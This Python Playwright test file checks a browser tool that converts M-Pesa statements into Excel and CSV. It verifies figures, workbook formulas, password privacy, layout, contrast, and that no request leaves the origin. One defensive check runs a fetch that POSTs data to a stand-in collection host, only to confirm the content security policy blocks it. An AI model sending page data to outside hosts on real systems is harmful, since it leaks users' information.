"""End-to-end tests in a real browser.

    pip install playwright openpyxl && python -m playwright install chromium
    python tests/e2e.py                  # all checks
    python tests/e2e.py --readme-shot    # also rewrite docs/screenshot.png

Serves the repo on a local port, opens index.html in Chromium and, for each synthetic statement, uploads
it, reads the figures and checks the page shows, downloads the workbook and the CSV and opens them. The
figures are compared with tests/fixtures/synthetic/expected.json. It fails if any request leaves the page's
own origin, if the content security policy blocks anything, if the password turns up anywhere outside the
password box, if the page logs an error, or if it scrolls sideways at 1280 or 390 px wide.
"""
import argparse
import functools
import http.server
import io
import json
import sys
import threading
import zipfile
from pathlib import Path

import openpyxl
from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parent.parent
FIX = ROOT / "tests" / "fixtures" / "synthetic"
OUT = ROOT / "tests" / "output"
EXPECT = json.loads((FIX / "expected.json").read_text())
PASSWORD = EXPECT["password"]
SHEETS = ["Summary", "Transactions", "Money in", "Money out", "Monthly", "Counterparties"]
KPI = {"Money in": "totalIn", "Money out": "totalOut", "Opening balance": "opening", "Closing balance": "closing",
       "Charges & fees": "charges", "Fuliza drawn": "fulizaDrawn"}

passed, failed = [], []


def check(ok, what):
    (passed if ok else failed).append(what)
    if not ok:
        print("FAIL", what)


def num(s):
    return float(s.replace(",", ""))


def serve():
    handler = functools.partial(Quiet, directory=str(ROOT))
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, f"http://127.0.0.1:{httpd.server_address[1]}"


class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a):
        pass


def launch(p):
    try:
        return p.chromium.launch()
    except Exception:
        return p.chromium.launch(channel="chrome")


class Session:
    """One browser context. Records every request, console message and CSP violation."""

    def __init__(self, browser, base, width=1280, height=900):
        self.base, self.requests, self.console, self.errors = base, [], [], []
        self.ctx = browser.new_context(viewport={"width": width, "height": height}, accept_downloads=True)
        self.ctx.add_init_script(CSP_INIT)
        self.ctx.on("request", lambda r: self.requests.append(r.url))
        self.page = self.ctx.new_page()
        self.page.on("console", lambda m: self.console.append((m.type, m.text)))
        self.page.on("pageerror", lambda e: self.errors.append(str(e)))
        self.page.goto(base + "/", wait_until="networkidle")

    def upload(self, *names, password=None):
        if password is not None:
            self.page.fill("#pw", password)
        self.page.set_input_files("#fileInput", [str(FIX / n) for n in names])
        self.page.wait_for_function(
            "n => document.querySelectorAll('#files .file').length === n && !document.querySelector('#files .spin')",
            arg=len(names), timeout=60000)

    def file_messages(self):
        return [(li.get_attribute("class"), li.query_selector(".msg").inner_text()) for li in self.page.query_selector_all("#files .file")]

    def kpis(self):
        out = {}
        for el in self.page.query_selector_all("#kpis .kpi"):
            out[el.query_selector(".k").text_content().strip()] = el.query_selector(".v").inner_text()
        return out

    def checks(self):
        return [(el.get_attribute("class"), el.inner_text()) for el in self.page.query_selector_all("#checks .check")]

    def download(self, button):
        with self.page.expect_download() as d:
            self.page.click(button)
        return d.value.suggested_filename, Path(d.value.path()).read_bytes()

    def csp(self):
        return self.page.evaluate("window.__csp")

    def close(self):
        self.ctx.close()


def check_results(s, label, e):
    """The page's figures and checks against the expected summary."""
    k = s.kpis()
    for name, key in KPI.items():
        check(abs(num(k[name]) - e[key]) < 0.005, f"{label}: {name} shows {k[name]} (expected {e[key]:,.2f})")
    net = e["totalIn"] - e["totalOut"]
    check(abs(num(k["Net flow"]) - net) < 0.005, f"{label}: Net flow {k['Net flow']}")
    title = s.page.inner_text("#resTitle")
    check(title == e["name"], f"{label}: title shows the account name ({title})")
    sub = s.page.inner_text("#resSub")
    check(sub.startswith(f"{e['mobile']} | {e['count']:,} transactions from "), f"{label}: subtitle '{sub}'")
    cs = s.checks()
    if e["mismatches"] == 0:
        check(cs[0][0] == "check ok" and f"All {e['count'] - 1:,} rows follow" in cs[0][1], f"{label}: balances reconcile")
    else:
        check(cs[0][0] == "check bad" and cs[0][1].startswith(f"{e['mismatches']} row(s) don't follow"), f"{label}: mismatch shown")
    if e["pdfTotals"] is None:
        check(not any("statement summary" in t for _, t in cs), f"{label}: no statement-total check for merged files")
    else:
        agree = abs(e["pdfTotals"]["in"] - e["totalIn"]) < 0.005 and abs(e["pdfTotals"]["out"] - e["totalOut"]) < 0.005
        hit = [c for c in cs if "statement summary" in c[1]]
        check(len(hit) == 1 and (hit[0][0] == "check ok") == agree and
              ("Totals match" if agree else "Totals differ") in hit[0][1], f"{label}: statement TOTAL check ({'match' if agree else 'differ'})")
    shown = len(s.page.query_selector_all("#tx tbody tr"))
    check(shown == min(e["count"], 300), f"{label}: {shown} transactions listed")
    bad = len(s.page.query_selector_all("#tx tbody tr.bad"))
    check(bad == e["mismatches"], f"{label}: {bad} rows highlighted")
    counts = sum(int(td.inner_text()) for td in s.page.query_selector_all("#types tbody tr td:nth-child(2)"))
    check(counts == e["count"], f"{label}: by-type counts add up to {counts}")


def check_workbook(label, name, data, e, rows, files=1):
    check(name.endswith(".xlsx") and name.startswith("MPesa_"), f"{label}: workbook name {name}")
    wb = openpyxl.load_workbook(io.BytesIO(data), data_only=True)
    check(wb.sheetnames == SHEETS, f"{label}: sheets {wb.sheetnames}")
    tx = wb["Transactions"]
    head = [c.value for c in tx[1]]
    check(head[:14] == ["Date & time", "Receipt No.", "Details", "Type", "Counterparty", "Phone / Till / Paybill", "Account",
                        "Status", "Paid in", "Withdrawn", "Balance", "Balance check", "Expected balance", "Difference"],
          f"{label}: transaction columns")
    check((head[14:] == ["Source file"]) == (files > 1), f"{label}: source file column only when files are merged")
    data_rows = [[c.value for c in r] for r in tx.iter_rows(min_row=2, max_row=e["count"] + 1)]
    check(len(data_rows) == e["count"] and tx.max_row == e["count"] + 2, f"{label}: {len(data_rows)} transaction rows and a totals row")
    check([r[1] for r in data_rows] == [x["receipt"] for x in rows], f"{label}: receipts in order")
    check([r[3] for r in data_rows] == [x["type"] for x in rows], f"{label}: types")
    paid = round(sum(r[8] or 0 for r in data_rows), 2)
    out = round(sum(r[9] or 0 for r in data_rows), 2)
    check(abs(paid - e["totalIn"]) < 0.005 and abs(out - e["totalOut"]) < 0.005, f"{label}: workbook totals {paid:,.2f} in, {out:,.2f} out")
    check(abs(data_rows[-1][10] - e["closing"]) < 0.005, f"{label}: last balance {data_rows[-1][10]}")
    totals = [c.value for c in tx[e["count"] + 2]]
    check(totals[7] == "Totals" and abs(totals[8] - e["totalIn"]) < 0.005 and abs(totals[9] - e["totalOut"]) < 0.005,
          f"{label}: totals row")
    mism = sum(1 for r in data_rows if str(r[11]).startswith("Mismatch"))
    check(mism == e["mismatches"], f"{label}: {mism} rows flagged in the workbook")
    # the check as live formulas: expected balance and difference, nonzero exactly on the flagged rows
    differs = [i for i, r in enumerate(data_rows) if r[13] is not None and abs(r[13]) > 0.005]
    flagged = [i for i, r in enumerate(data_rows) if str(r[11]).startswith("Mismatch")]
    check(differs == flagged and data_rows[0][12] is None, f"{label}: Difference is nonzero on the {len(flagged)} flagged rows only")
    check(all(r[12] is not None and abs(r[12] - (data_rows[i - 1][10] + (r[8] or 0) - (r[9] or 0))) < 0.005 for i, r in enumerate(data_rows) if i),
          f"{label}: Expected balance is the previous balance plus money in minus money out")
    if len(data_rows) > 1:
        ftx = openpyxl.load_workbook(io.BytesIO(data))["Transactions"]
        check(ftx.cell(3, 13).value == "=K2+I3-J3" and ftx.cell(3, 14).value == "=ROUND(K3-M3,2)", f"{label}: the check is live Excel formulas")
    sm = wb["Summary"]
    vals = {sm.cell(r, 2).value: sm.cell(r, 3).value for r in range(1, sm.max_row + 1) if sm.cell(r, 2).value}
    for k, key in [("Opening balance", "opening"), ("Money in", "totalIn"), ("Money out", "totalOut"), ("Closing balance", "closing"),
                   ("Transaction charges & fees", "charges"), ("Fuliza drawn", "fulizaDrawn"), ("Fuliza repaid", "fulizaRepaid")]:
        check(abs(vals[k] - e[key]) < 0.005, f"{label}: Summary sheet {k} {vals[k]}")
    check(vals["Transactions"] == e["count"], f"{label}: Summary sheet count")
    live = vals.get("Running balance, recalculated by Excel", "")
    check(live.startswith("OK:") if e["mismatches"] == 0 else live.startswith(f"CHECK: {e['mismatches']} row(s) differ"),
          f"{label}: Summary sheet recalculates the running balance '{live[:40]}'")
    mo = wb["Monthly"]
    months = [r for r in mo.iter_rows(min_row=2, values_only=True) if r[0] not in (None, "Total")]
    check(sum(r[1] for r in months) == e["count"], f"{label}: monthly counts add up")
    # Money in and Money out: every transaction in that direction, its total and the tie to the Summary
    for sheet, key, total in [("Money in", "paidIn", "totalIn"), ("Money out", "withdrawn", "totalOut")]:
        ws = wb[sheet]
        want = [x for x in rows if x[key] > 0]
        head = [c.value for c in ws[1]]
        check(head[:10] == ["Date & time", "Receipt No.", "Details", "Type", "Counterparty", "Phone / Till / Paybill", "Account",
                            sheet, "Balance after", "Balance check"], f"{label}: {sheet} columns")
        got = [[c.value for c in r] for r in ws.iter_rows(min_row=2, max_row=len(want) + 1)]
        check([g[1] for g in got] == [x["receipt"] for x in want] and [g[2] for g in got] == [x["details"] for x in want],
              f"{label}: {sheet} lists its {len(want)} transactions with their details")
        check(all(abs(g[7] - x[key]) < 0.005 and abs(g[8] - x["balance"]) < 0.005 for g, x in zip(got, want)),
              f"{label}: {sheet} amounts and balances")
        tot = [c.value for c in ws[len(want) + 2]]
        tie = [c.value for c in ws[len(want) + 3]]
        check(tot[6] == f"Total ({len(want)} transactions)" and abs(tot[7] - e[total]) < 0.005, f"{label}: {sheet} total {tot[7]}")
        check(tie[7] == "OK", f"{label}: {sheet} ties to the Summary")
        formula = openpyxl.load_workbook(io.BytesIO(data))[sheet].cell(len(want) + 3, 8).value
        check(str(formula).startswith("=IF(ROUND(SUM(H2:H") and ("Summary!C11" if key == "paidIn" else "Summary!C12") in formula,
              f"{label}: {sheet} tie is a live formula on the Summary's {sheet.lower()}")
    return wb


def line_count(text, width):
    """The workbook's own count of wrapped lines (lib/excel.js, lineCount), written again here."""
    cap = max(8, int(width * 0.85))
    n, cur = 1, 0
    for w in str(text or "").split():
        need = cur + 1 + len(w) if cur else len(w)
        if need <= cap:
            cur = need
            continue
        if cur:
            n += 1
        n += (len(w) - 1) // cap
        cur = len(w) % cap or cap
    return n


def check_wrapping(label, data, rows):
    """Long details and names are never cut off: their cells wrap and each row is tall enough for its lines."""
    wb = openpyxl.load_workbook(io.BytesIO(data))
    for sheet, key in [("Transactions", None), ("Money in", "paidIn"), ("Money out", "withdrawn")]:
        ws = wb[sheet]
        want = [x for x in rows if key is None or x[key] > 0]
        bad, tall = [], 0
        for i, x in enumerate(want, 2):
            d, c = ws.cell(i, 3), ws.cell(i, 5)
            need = max(line_count(x["details"], 58), line_count(x["party"], 30))
            h = ws.row_dimensions[i].height
            ok = d.alignment.wrap_text and c.alignment.wrap_text and d.alignment.vertical == "top" and \
                (h is not None and h >= need * 15 if need > 1 else (h is None or h <= 17))
            tall += need > 1
            if not ok:
                bad.append((i, need, h, d.alignment.wrap_text))
        check(not bad, f"{label}: {sheet} details and names wrap, rows tall enough ({tall} of {len(want)} need more than one line) {bad[:3]}")


def check_line_estimate():
    """The workbook's line count is never short of the lines Excel draws: every fixture's details, and some long
    names, laid out in Calibri 11 (Excel's default) at the Details column's width in pixels. Needs the Calibri
    font, which is on Windows; skipped elsewhere."""
    try:
        from PIL import ImageFont
        font = ImageFont.truetype("calibri.ttf", 15)  # 11pt at 96 dpi is 14.7px; 15px errs on the wide side
    except Exception:
        print("skip: Calibri not found, so the line estimate is not checked against real glyph widths")
        return
    texts = {x["details"] for e in EXPECT["statements"].values() for x in e.get("rows", [])}
    texts |= {"Customer Transfer to 2547******123 - MWANGI KAMAU WAMBUI NJOROGE OTIENO WANJIKU MUTUA",
              "Pay Bill Online to 888888 - KENYA WATER AND SEWERAGE COMPANY LIMITED WESTLANDS BRANCH Acc. 0000123456789"}
    for width, col in [(58, "Details")]:
        px = width * 7 + 5 - 4  # Excel's pixel width for the column, less the cell's padding
        short = []
        for t in texts:
            lines, cur = 1, ""
            for w in t.split():
                trial = (cur + " " + w) if cur else w
                if font.getlength(trial) <= px:
                    cur = trial
                else:
                    lines += 1 if cur else 0
                    cur = w
            if lines > line_count(t, width):
                short.append((t[:50], lines, line_count(t, width)))
        check(not short, f"{col}: the workbook's line count covers what Excel draws in Calibri ({len(texts)} texts) {short[:2]}")


def check_direction(s, label, e, rows):
    """The page's Money in / Money out filter lists one direction and shows its total."""
    for value, key, total in [("in", "paidIn", "totalIn"), ("out", "withdrawn", "totalOut")]:
        s.page.select_option("#dirFilter", value)
        n = sum(1 for x in rows if x[key] > 0)
        shown = len(s.page.query_selector_all("#tx tbody tr"))
        count = s.page.inner_text("#count")
        check(shown == min(n, 300) and f"{value} {e[total]:,.2f}" in count, f"{label}: money {value} filter lists {shown} and shows '{count}'")
    s.page.select_option("#dirFilter", "bad")
    shown = s.page.query_selector_all("#tx tbody tr")
    check(len(shown) == e["mismatches"] and all("bad" in (r.get_attribute("class") or "") for r in shown),
          f"{label}: 'rows that don't reconcile' lists {len(shown)}")
    s.page.select_option("#dirFilter", "")
    count = s.page.inner_text("#count")
    check(f"in {e['totalIn']:,.2f} | out {e['totalOut']:,.2f}" in count, f"{label}: all rows show both totals '{count}'")
    # a type in the By type table opens its transactions
    b = s.page.query_selector("#types tbody button[data-type]")
    t = b.get_attribute("data-type")
    b.click()
    n = sum(1 for x in rows if x["type"] == t)
    check(s.page.input_value("#typeFilter") == t and len(s.page.query_selector_all("#tx tbody tr")) == min(n, 300),
          f"{label}: '{t}' in the By type table lists its {n} transactions")
    s.page.select_option("#typeFilter", "")
    if e["mismatches"]:
        s.page.click("#showBad")
        check(s.page.input_value("#dirFilter") == "bad" and len(s.page.query_selector_all("#tx tbody tr.bad")) == e["mismatches"],
              f"{label}: 'Show them' lists the rows that don't reconcile")
        s.page.select_option("#dirFilter", "")


def check_csv(label, name, data, e):
    check(name.endswith(".csv"), f"{label}: CSV name {name}")
    check(data[:3] == b"\xef\xbb\xbf", f"{label}: CSV starts with the UTF-8 byte order mark")
    lines = data[3:].decode("utf-8").split("\r\n")
    check(len(lines) == e["count"] + 1, f"{label}: CSV has {len(lines) - 1} rows")


def no_password_in(label, *blobs):
    pw = PASSWORD.encode()
    for what, b in blobs:
        if what.endswith(".xlsx"):
            with zipfile.ZipFile(io.BytesIO(b)) as z:
                hit = any(pw in z.read(n) for n in z.namelist())
        else:
            hit = pw in b
        check(not hit, f"{label}: password not in {what}")


CSP_INIT = """
    window.__csp = [];
    document.addEventListener('securitypolicyviolation',
      (e) => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI));
"""

# WCAG AA: every piece of text against the colour actually behind it (cards are translucent over the page)
CONTRAST = """() => {
  const parse = (s) => {
    let m = s.match(/^rgba?\\(([^)]+)\\)/);
    if (m) { const p = m[1].split(/[\\s,\\/]+/).filter(Boolean).map(Number); return [p[0], p[1], p[2], p.length > 3 ? p[3] : 1]; }
    m = s.match(/^color\\(srgb ([^)]+)\\)/);
    if (m) { const p = m[1].split(/[\\s\\/]+/).filter(Boolean).map(Number); return [p[0] * 255, p[1] * 255, p[2] * 255, p.length > 3 ? p[3] : 1]; }
    return null;
  };
  const over = (t, b) => [t[0] * t[3] + b[0] * (1 - t[3]), t[1] * t[3] + b[1] * (1 - t[3]), t[2] * t[3] + b[2] * (1 - t[3]), 1];
  const ground = parse(getComputedStyle(document.body).backgroundColor);
  const bgOf = (el) => {
    const chain = [];
    for (let e = el; e && e !== document.documentElement; e = e.parentElement) chain.push(e);
    let bg = ground;
    for (let i = chain.length - 1; i >= 0; i--) { const c = parse(getComputedStyle(chain[i]).backgroundColor); if (c && c[3] > 0) bg = over(c, bg); }
    return bg;
  };
  const lum = (c) => { const f = (v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); };
    return 0.2126 * f(c[0]) + 0.7152 * f(c[1]) + 0.0722 * f(c[2]); };
  const bad = [];
  document.querySelectorAll('h1,h2,h3,.lede,.eyebrow,.drop strong,.drop > span,.field label,.field small,.file .name,.file .msg,' +
      '.kpi .k,.kpi .v,.check,th,td,.count,.pill,footer div,.btn,.linkish,.mp-wc,.mp-nm,.mp-role,.mp-theme,#resSub').forEach((el) => {
    const r = el.getBoundingClientRect(), cs = getComputedStyle(el);
    if (!r.width || !r.height || cs.visibility === 'hidden' || !el.textContent.trim()) return;
    const bg = bgOf(el), fg = over(parse(cs.color), bg);
    const a = lum(fg), b = lum(bg), ratio = (Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05);
    const size = parseFloat(cs.fontSize), need = size >= 24 || (parseInt(cs.fontWeight) >= 600 && size >= 18.66) ? 3 : 4.5;
    if (ratio < need) bad.push(el.tagName + '.' + el.className + ' "' + el.textContent.trim().slice(0, 30) + '" ' + ratio.toFixed(2));
  });
  return bad;
}"""


def phones_and_themes(browser, base, devices):
    """On a phone: the upload area says to choose (not drop), a tap opens the file picker, files phones hand over
    without a name or type are read, other files are refused, the password box takes letters and is large enough
    not to zoom, the workbook downloads, nothing scrolls sideways and nothing leaves the origin. Then the two
    themes: the switch, the choice remembered, and contrast."""
    pdf = (FIX / "clean_month.pdf").read_bytes()
    e = EXPECT["statements"]["clean_month.pdf"]["summary"]
    wait = "n => document.querySelectorAll('#files .file').length === n && !document.querySelector('#files .spin')"
    for dev in ("iPhone 13", "Pixel 7"):
        ctx = browser.new_context(**devices[dev], accept_downloads=True)
        ctx.add_init_script(CSP_INIT)
        reqs, errs = [], []
        ctx.on("request", lambda r: reqs.append(r.url))
        pg = ctx.new_page()
        pg.on("pageerror", lambda x: errs.append(str(x)))
        pg.on("console", lambda m: m.type == "error" and errs.append(m.text))
        pg.goto(base + "/", wait_until="networkidle")
        w = pg.viewport_size["width"]
        check(pg.is_visible(".drop .d-touch") and not pg.is_visible(".drop .d-desk"), f"{dev}: the upload area says to choose a PDF, not to drop one")
        with pg.expect_file_chooser() as fc:
            pg.tap("#drop")
        check(fc.value.is_multiple(), f"{dev}: a tap on the upload area opens the file picker")
        fc.value.set_files(str(FIX / "clean_month.pdf"))
        pg.wait_for_function(wait, arg=1, timeout=60000)
        k = {el.query_selector(".k").text_content().strip(): el.query_selector(".v").inner_text() for el in pg.query_selector_all("#kpis .kpi")}
        check(abs(num(k["Money in"]) - e["totalIn"]) < 0.005 and abs(num(k["Money out"]) - e["totalOut"]) < 0.005,
              f"{dev}: the statement chosen in the picker is read ({k['Money in']} in, {k['Money out']} out)")
        sw = pg.evaluate("document.documentElement.scrollWidth")
        check(sw <= w, f"{dev}: no sideways scroll with results ({sw} at {w})")
        check(pg.get_attribute("#pw", "inputmode") in (None, "text"), f"{dev}: the password box takes letters as well as numbers")
        fs = pg.eval_on_selector("#pw", "e => parseFloat(getComputedStyle(e).fontSize)")
        check(fs >= 16, f"{dev}: the password box text is {fs}px, so a phone does not zoom in on it")
        with pg.expect_download(timeout=60000) as d:
            pg.tap("#dlXlsx")
        wb = openpyxl.load_workbook(io.BytesIO(Path(d.value.path()).read_bytes()), data_only=True)
        check(wb.sheetnames == SHEETS, f"{dev}: the workbook downloads")
        for name, mime in (("statement", ""), ("MPESA_Statement", "application/octet-stream")):
            pg.goto(base + "/", wait_until="networkidle")
            pg.set_input_files("#fileInput", files=[{"name": name, "mimeType": mime, "buffer": pdf}])
            pg.wait_for_function(wait, arg=1, timeout=60000)
            msg = pg.inner_text("#files .file .msg")
            check(msg.startswith(f"{e['count']} transactions"), f"{dev}: a PDF named '{name}' with type '{mime}' is read ({msg})")
        pg.goto(base + "/", wait_until="networkidle")
        pg.set_input_files("#fileInput", files=[{"name": "notes.pdf", "mimeType": "application/pdf", "buffer": b"not a statement"}])
        pg.wait_for_function("() => document.querySelector('#toast').classList.contains('show')")
        check(len(pg.query_selector_all("#files .file")) == 0 and "is not a PDF" in pg.inner_text("#toast"),
              f"{dev}: a file that is not a PDF is refused: '{pg.inner_text('#toast')}'")
        away = sorted({u for u in reqs if not (u.startswith(base + "/") or u.startswith(("data:", "blob:")))})
        check(not away and not pg.evaluate("window.__csp") and not errs, f"{dev}: nothing leaves the origin, no policy violations or errors {away} {errs[:2]}")
        ctx.close()

    # the site's navigation, as on every other page of the site (written by its tools/kenya_nav.py)
    s = Session(browser, base)
    p = s.page
    links = p.eval_on_selector_all(".mp-side .mp-nav a", "els => els.map(a => [a.textContent.trim(), a.getAttribute('href'), a.getAttribute('aria-current')])")
    hrefs = {h for _, h, _ in links}
    check({"https://maidenpeter.github.io/", "https://maidenpeter.github.io/ask/", "https://maidenpeter.github.io/about/",
           "https://maidenpeter.github.io/#contact"} <= hrefs, f"navigation: the side bar leads to Home, Ask the data, About and Contact")
    here = [t for t, h, c in links if c == "page"]
    check(here == ["01Statement to Excel"], f"navigation: this page is marked in the side bar {here}")
    back = p.get_attribute(".mp-back", "href")
    check(back == "https://maidenpeter.github.io/#mpesa-series", f"navigation: Back goes to the M-Pesa series ({back})")
    where = " ".join(p.inner_text(".mp-where").split())
    check(where.upper() == "I DATA ANALYSIS / M-PESA SERIES", f"navigation: the top bar says where the page sits ('{where}')")
    side = p.eval_on_selector(".mp-side", "e => e.getBoundingClientRect().right")
    main_left = p.eval_on_selector("main", "e => e.getBoundingClientRect().left")
    check(p.is_visible(".mp-side") and side <= main_left + 1, f"navigation: the side bar sits beside the tool, not over it ({side} / {main_left})")
    s.close()
    ctx = browser.new_context(**devices["Pixel 7"])
    pg = ctx.new_page()
    pg.goto(base + "/", wait_until="networkidle")
    bar = pg.eval_on_selector(".mp-side .mp-nav", "e => { const r = e.getBoundingClientRect(); return [r.top, r.bottom, innerHeight] }")
    check(bar[1] >= bar[2] - 1 and bar[0] > bar[2] / 2, f"navigation on a phone: the site's bar along the bottom ({bar})")
    pg.evaluate("window.scrollTo(0, document.documentElement.scrollHeight)")
    pg.wait_for_timeout(300)
    last = pg.eval_on_selector("footer", "e => e.getBoundingClientRect().bottom")
    top = pg.eval_on_selector(".mp-side .mp-nav", "e => e.getBoundingClientRect().top")
    check(last <= top + 1, f"navigation on a phone: the end of the page scrolls clear of the bar ({last} / {top})")
    ctx.close()

    # the theme switch: ink by default, paper one click away, remembered as on the site
    s = Session(browser, base)
    p = s.page
    check(p.get_attribute("html", "data-theme") is None and p.inner_text(".mp-theme").strip() == "Paper theme", "theme: ink by default, with a switch to paper")
    check(p.get_attribute(".mp-brand", "href") == "https://maidenpeter.github.io/", "the name in the top bar leads to the site")
    p.click(".mp-theme")
    check(p.get_attribute("html", "data-theme") == "light" and p.evaluate("localStorage.getItem('mp-theme')") == "light", "theme: switched to paper and remembered")
    p.reload(wait_until="networkidle")
    check(p.get_attribute("html", "data-theme") == "light" and p.inner_text(".mp-theme").strip() == "Ink theme", "theme: still paper after a reload")
    for theme in ("light", "dark"):
        # a statement with a mismatched row and a locked one, so the warning colours are on the page too
        p.evaluate(f"localStorage.setItem('mp-theme', '{theme}')")
        p.goto(base + "/", wait_until="networkidle")
        p.set_input_files("#fileInput", [str(FIX / "balance_break.pdf"), str(FIX / "locked.pdf")])
        p.wait_for_function(wait, arg=2, timeout=60000)
        p.wait_for_timeout(300)
        check(p.get_attribute("html", "data-theme") == theme, f"{theme} theme: set from the stored choice")
        bad = p.evaluate(CONTRAST)
        check(not bad, f"{theme} theme: all text meets WCAG AA contrast {bad[:4]}")
        p.screenshot(path=str(OUT / f"theme-{theme}.png"), full_page=True)
    s.close()


def run(browser, base, readme_shot, devices):
    OUT.mkdir(parents=True, exist_ok=True)
    sessions = []
    check_line_estimate()

    # single statements
    for name, e in EXPECT["statements"].items():
        if e.get("error") or e.get("password"):
            continue
        s = Session(browser, base)
        sessions.append(s)
        s.upload(name)
        msgs = s.file_messages()
        check(msgs[0][0] == "file " and msgs[0][1].startswith(f"{e['summary']['count']:,} transactions"), f"{name}: file line '{msgs[0][1]}'")
        check_results(s, name, e["summary"])
        check_direction(s, name, e["summary"], e["rows"])
        xn, xb = s.download("#dlXlsx")
        check_workbook(name, xn, xb, e["summary"], e["rows"])
        check_wrapping(name, xb, e["rows"])
        cn, cb = s.download("#dlCsv")
        check_csv(name, cn, cb, e["summary"])

    # two overlapping statements together
    m = EXPECT["merges"]["overlap"]
    s = Session(browser, base)
    sessions.append(s)
    s.upload(*m["files"])
    check_results(s, "overlap merged", m["summary"])
    xn, xb = s.download("#dlXlsx")
    wb = check_workbook("overlap merged", xn, xb, m["summary"], m["rows"], files=2)
    check_wrapping("overlap merged", xb, m["rows"])
    src = {r[14] for r in wb["Transactions"].iter_rows(min_row=2, max_row=m["summary"]["count"] + 1, values_only=True)}
    check(src == set(m["files"]), f"overlap merged: source files {sorted(src)}")

    # password: none, wrong, right, then the main password box
    e = EXPECT["statements"]["locked.pdf"]
    s = Session(browser, base)
    sessions.append(s)
    s.upload("locked.pdf")
    check(s.file_messages()[0] == ("file err", "This file is password-protected. Enter its password."), "locked: asks for the password")
    for attempt, want in [("WRONG000", "Wrong password. Try again."), (PASSWORD, None)]:
        before = s.file_messages()[0][1]
        s.page.fill("#files .retry input", attempt)
        s.page.click("#files .retry button")
        s.page.wait_for_function("b => { const m = document.querySelector('#files .file .msg'); return m && !document.querySelector('#files .spin') && m.textContent !== b; }",
                                 arg=before, timeout=60000)
        got = s.file_messages()[0]
        if want:
            check(got == ("file err", want), f"locked: wrong password message '{got[1]}'")
        else:
            check(got[0] == "file ", f"locked: opens with the right password ({got[1]})")
    check_results(s, "locked.pdf", e["summary"])
    xn, xb = s.download("#dlXlsx")
    check_workbook("locked.pdf", xn, xb, e["summary"], e["rows"])
    cn, cb = s.download("#dlCsv")
    store = s.page.evaluate("() => JSON.stringify([location.href, document.cookie, Object.entries(localStorage), Object.entries(sessionStorage), history.length])")
    html = s.page.evaluate("() => { const c = document.documentElement.cloneNode(true); c.querySelectorAll('input').forEach(i => i.remove()); return c.outerHTML; }")
    logs = "\n".join(t for _, t in s.console)
    no_password_in("locked", ("workbook.xlsx", xb), ("export.csv", cb), ("URL, cookies and storage", store.encode()),
                   ("the page outside the password boxes", html.encode()), ("the console", logs.encode()))
    s2 = Session(browser, base)
    sessions.append(s2)
    s2.upload("locked.pdf", password=PASSWORD)
    check(s2.file_messages()[0][0] == "file ", "locked: opens with the password typed first")

    # no text layer
    s = Session(browser, base)
    sessions.append(s)
    s.upload("scanned.pdf")
    got = s.file_messages()[0]
    check(got == ("file err", "This PDF has no readable text (it looks scanned). Download the statement again from the M-Pesa app."),
          f"scanned: '{got[1]}'")
    check(not s.page.is_visible("#results"), "scanned: no results shown")

    # layout at 1280 and 390 px, and the screenshots
    for w, h in [(1280, 900), (390, 844)]:
        s = Session(browser, base, w, h)
        sessions.append(s)
        sw = s.page.evaluate("document.documentElement.scrollWidth")
        check(sw <= w, f"empty page at {w}px: no sideways scroll ({sw})")
        s.page.screenshot(path=str(OUT / f"empty-{w}.png"), full_page=True)
        s.upload("clean_month.pdf")
        s.page.wait_for_timeout(200)
        sw = s.page.evaluate("document.documentElement.scrollWidth")
        check(sw <= w, f"results at {w}px: no sideways scroll ({sw})")
        s.page.screenshot(path=str(OUT / f"results-{w}.png"), full_page=True)
        if readme_shot and w == 1280:
            (ROOT / "docs").mkdir(exist_ok=True)
            s.page.screenshot(path=str(ROOT / "docs" / "screenshot.png"), full_page=True,
                              clip={"x": 0, "y": 0, "width": 1280, "height": 1240})

    # what left the page, across every session
    origin = base
    reqs = [u for s in sessions for u in s.requests]
    away = sorted({u for u in reqs if not (u.startswith(origin + "/") or u.startswith("data:") or u.startswith("blob:"))})
    check(not away, f"no request leaves the origin ({len(reqs)} requests; away: {away})")
    check(any(u.endswith("/lib/pdf.worker.min.js") for u in reqs), "the pdf.js worker loads from the page's own origin")
    csp = [v for s in sessions for v in s.csp()]
    check(not csp, f"no content security policy violations {csp}")
    errs = [x for s in sessions for x in s.errors] + [t for s in sessions for k, t in s.console if k == "error"]
    check(not errs, f"no page errors or console errors {errs[:3]}")
    for s in sessions:
        s.close()

    # the policy itself: a script on the page cannot reach another origin
    s = Session(browser, base)
    blocked = s.page.evaluate("""async () => {
        try { await fetch('https://example.com/collect', { method: 'POST', body: 'x' }); return 'sent'; }
        catch (e) { return 'blocked'; } }""")
    s.page.wait_for_timeout(200)
    check(blocked == "blocked" and any(v.startswith("connect-src") for v in s.csp()), "the policy blocks a request to another origin")
    s.close()

    phones_and_themes(browser, base, devices)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--readme-shot", action="store_true")
    args = ap.parse_args()
    httpd, base = serve()
    try:
        with sync_playwright() as p:
            browser = launch(p)
            run(browser, base, args.readme_shot, p.devices)
            browser.close()
    finally:
        httpd.shutdown()
    print(f"{len(passed)} checks passed, {len(failed)} failed.")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
